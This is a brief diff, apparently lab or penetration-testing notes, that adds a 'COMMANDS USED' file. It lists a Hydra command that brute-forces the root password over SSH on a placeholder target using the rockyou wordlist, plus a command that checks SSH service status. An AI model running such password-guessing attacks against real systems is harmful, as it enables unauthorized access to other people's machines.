@@ -1,0 +1,5 @@
+COMMANDS USED
+
+# hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET-IP
+
+# sudo systemctl status ssh
